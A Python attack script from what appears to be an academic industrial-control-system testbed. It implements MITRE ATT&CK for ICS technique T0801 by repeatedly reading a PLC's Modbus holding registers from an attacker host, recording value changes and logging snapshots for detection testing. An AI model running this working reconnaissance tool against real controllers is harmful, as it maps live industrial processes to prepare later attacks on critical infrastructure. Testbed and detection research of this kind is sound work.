#!/usr/bin/env python3
"""
ASCEND-PG attacks/monitor_process_state.py

MITRE ATT&CK for ICS: T0801 — Monitor Process State.

Simulates an unauthorized entity monitoring the industrial process by
repeatedly reading all holding registers to observe value changes over
time. In a real ICS, this allows the attacker to learn normal operating
parameters, identify setpoints, and plan subsequent attacks (e.g., FDI
targeting specific registers).

Implementation:
  - Uses pymodbus FC03 (Read Holding Registers) to read all 100 registers
  - Performs multiple read cycles with delays to observe value changes
  - Logs register snapshots to data/log_store.json for analysis
  - Detection: High request volume triggers Suricata's modbus.flooded
    rule (SID 9000002), or normal traffic triggers SID 9000004 if
    device identification is used

Run this ON THE ATTACKER HOST:
    python3 attacks/monitor_process_state.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[monitor_process] ERROR: pymodbus not installed. Run: pip install pymodbus")
    sys.exit(1)

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

# Default register range to monitor
DEFAULT_START_REG = 0
DEFAULT_END_REG = 99
DEFAULT_READ_COUNT = 10  # number of read cycles


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def run_monitor(target: str, port: int, unit: int,
                start_reg: int, end_reg: int, count: int,
                delay: float, log_path: Path) -> dict:
    """Read holding registers repeatedly to monitor process state.

    Returns dict with stats including observed value changes.
    """
    stats = {
        "read_cycles": 0,
        "registers_read": 0,
        "value_changes": 0,
        "errors": 0,
    }

    print(f"[monitor_process] Connecting to {target}:{port} (unit={unit})")
    client = ModbusTcpClient(target, port=port, timeout=5)
    if not client.connect():
        print(f"[monitor_process] ERROR: Cannot connect to {target}:{port}")
        return stats

    try:
        num_regs = end_reg - start_reg + 1
        print(f"[monitor_process] Monitoring registers {start_reg}-{end_reg} "
              f"({num_regs} registers, {count} cycles)")

        previous_values = {}

        for cycle in range(count):
            # Read registers in chunks (Modbus limits read to ~125 registers)
            all_values = {}
            chunk_size = 100

            for chunk_start in range(start_reg, end_reg + 1, chunk_size):
                chunk_end = min(chunk_start + chunk_size - 1, end_reg)
                chunk_count = chunk_end - chunk_start + 1

                try:
                    result = client.read_holding_registers(
                        chunk_start, chunk_count, slave=unit
                    )
                    if result.isError():
                        stats["errors"] += 1
                        continue

                    for i, val in enumerate(result.registers):
                        all_values[chunk_start + i] = val
                        stats["registers_read"] += 1

                except Exception as exc:
                    print(f"[monitor_process] Read error at {chunk_start}: {exc}")
                    stats["errors"] += 1

            # Detect value changes from previous cycle
            cycle_changes = 0
            for addr, val in all_values.items():
                if addr in previous_values and previous_values[addr] != val:
                    cycle_changes += 1
            stats["value_changes"] += cycle_changes

            stats["read_cycles"] += 1
            print(f"[monitor_process] Cycle {cycle + 1}/{count}: "
                  f"{len(all_values)} regs read, {cycle_changes} changes detected")

            # Log the snapshot (limited detail to avoid huge logs)
            if cycle == 0 or cycle_changes > 0:
                log_event(log_path, {
                    "stage": "attack", "technique": "T0801",
                    "action": "monitor_snapshot",
                    "cycle": cycle + 1,
                    "registers_read": len(all_values),
                    "changes_detected": cycle_changes,
                    "sample_values": dict(list(all_values.items())[:10]),
                })

            previous_values = all_values.copy()

            if delay > 0 and cycle < count - 1:
                time.sleep(delay)

    except Exception as exc:
        print(f"[monitor_process] Unexpected error: {exc}")
        stats["errors"] += 1
    finally:
        client.close()

    return stats


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Monitor Process State (T0801) — unauthorized "
                    "monitoring of PLC holding registers to observe process changes"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address")
    parser.add_argument("-p", "--port", type=int, default=502,
                        help="Modbus TCP port (default: 502)")
    parser.add_argument("-u", "--unit", type=int, default=1,
                        help="Modbus unit/slave ID (default: 1)")
    parser.add_argument("--start-reg", type=int, default=DEFAULT_START_REG,
                        help=f"First register address (default: {DEFAULT_START_REG})")
    parser.add_argument("--end-reg", type=int, default=DEFAULT_END_REG,
                        help=f"Last register address (default: {DEFAULT_END_REG})")
    parser.add_argument("-c", "--count", type=int, default=DEFAULT_READ_COUNT,
                        help=f"Number of read cycles (default: {DEFAULT_READ_COUNT})")
    parser.add_argument("-d", "--delay", type=float, default=1.0,
                        help="Delay between cycles in seconds (default: 1.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0801",
        "action": "monitor_start",
        "target": args.target,
        "register_range": f"{args.start_reg}-{args.end_reg}",
        "cycles": args.count,
    })

    stats = run_monitor(
        args.target, args.port, args.unit,
        args.start_reg, args.end_reg, args.count,
        args.delay, log_path,
    )

    log_event(log_path, {
        "stage": "attack", "technique": "T0801",
        "action": "monitor_end",
        "target": args.target,
        "read_cycles": stats["read_cycles"],
        "registers_read": stats["registers_read"],
        "value_changes": stats["value_changes"],
        "errors": stats["errors"],
    })

    print(f"\n[monitor_process] Done — {stats['read_cycles']} cycles, "
          f"{stats['registers_read']} register reads, "
          f"{stats['value_changes']} value changes, "
          f"{stats['errors']} errors")


if __name__ == "__main__":
    main()
